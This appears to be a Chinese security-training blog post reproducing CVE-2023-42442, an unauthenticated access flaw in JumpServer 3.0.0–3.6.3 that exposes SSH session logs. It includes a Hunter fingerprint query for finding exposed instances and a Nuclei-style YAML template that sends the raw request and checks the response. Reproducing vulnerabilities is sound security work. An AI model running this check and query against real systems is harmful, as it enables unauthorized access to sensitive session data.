# 原创
：  漏洞复现 | JumpServer未授权访问漏洞

# 漏洞复现 | JumpServer未授权访问漏洞

> 
公众号：掌控安全EDU 分享更多技术文章，欢迎关注一起探讨学习


**目录**

[【漏洞复现】JumpServer未授权访问漏洞 CVE-2023-42442](#%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91JumpServer%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2023-42442)

[【JumpServer开源堡垒机介绍】](#%E3%80%90JumpServer%E5%BC%80%E6%BA%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%BB%8B%E7%BB%8D%E3%80%91)

[【受影响版本：】JumpServer 3.0.0 - 3.6.3](#%E3%80%90%E5%8F%97%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A%E3%80%91JumpServer%203.0.0%20-%203.6.3)

[【漏洞验证】](#%E3%80%90%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E3%80%91)

[【自动化POC验证】](#%E3%80%90%E8%87%AA%E5%8A%A8%E5%8C%96POC%E9%AA%8C%E8%AF%81%E3%80%91)

---


### 【漏洞复现】JumpServer未授权访问漏洞 CVE-2023-42442

---


### 【JumpServer开源堡垒机介绍】

---


JumpServer开源堡垒机是一款运维安全审计系统产品，提供身份验证、授权控制、账号管理、安全审计等功能支持，帮助企业快速构建运维安全审计能力。JumpServer开源堡垒机通过企业版或者软硬件一体机的方式，向企业级用户交付开源增值的运维安全审计解决方案。

该漏洞存在于JumpServer中，是一个未授权访问漏洞。api/api/v1/terminal/sessions/权限控制存在逻辑错误，可以被攻击者匿名访问。未经身份验证的远程攻击者可利用该漏洞下载ssh日志，并可借此远程窃取敏感信息。存储在 S3、OSS 或其他云存储中的ssh会话不受影响。

### 【受影响版本：】JumpServer 3.0.0 - 3.6.3

---


【指纹搜索】<br/> Hunter：app.name=”JumpServer”<img alt="" height="595" src="https://img-blog.csdnimg.cn/9ab7f8bce1bd4f938f0f8b87e49fe467.png" width="1080"/>

### 【漏洞验证】

---


### 【自动化POC验证】

---


<img alt="" height="441" src="https://img-blog.csdnimg.cn/22e794385ad8484a8da17ea27a44c1c5.png" width="1080"/>**【Ykait-Poc验证】**

---


```
id: JumpServer

info:
  name: JumpServer
  author: hacker
  severity: info
  description: description
  reference:
    - https://
  tags: tags

requests:
  - raw:
      - |+
        GET /api/v1/terminal/sessions/ HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: identity
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Cookie: jms_csrftoken=7jey7HadfzOeWIPuaS9y3RjwrlfamxlRN6oigeqCeg8Tkcl3QdvbUUd3Hs5aZa8q; SESSION_COOKIE_NAME_PREFIX=jms_; jms_public_key="LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEWUlIL2g5REszNFFEZlpWcjdISHpYSTRsLwozLzdEOVlsWEYrQjdxOW1rM3R4RjF0bk53WWNLbUQrQjBsVFVxYjZiTWVnMjRWeW9mM0o3L1hMNHpvUFhZNFp1CkgxZmc2Zk9vbXBxUUptemFsTGY5ZEJXdHBmd1pUVW1MejZpZlhRTDA3QkxYZWRIeXVPZHlyZU1ELzRlWU40OUkKNk9ZMWsvQTNKVGw0eG5TWjRRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ=="; jms_sessionid=z62zrdkzk7rfjldmbrymv8ol5v5q4tud
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - user
      - type: status
        status:
          - 200
```

**没看够~？欢迎关注！**

**  **<img alt="" height="567" src="https://img-blog.csdnimg.cn/d89b5fd1e8b24bb0a88152b3995f9ebd.jpeg" width="1015"/>

###  渗透工具

### 技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/f333a24647774be5b99b00fb7019d620.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/3e579b7d7a164889a57771c035775069.png" width="856"/>

### 面试题

### 帮助你在面试中脱颖而出

### 视频

### 基础到进阶

### 环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/a601ca2e0eb040bd911477a4f54fef8e.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/04beeeb6757b422a83ca0900a349a544.png" width="665"/>
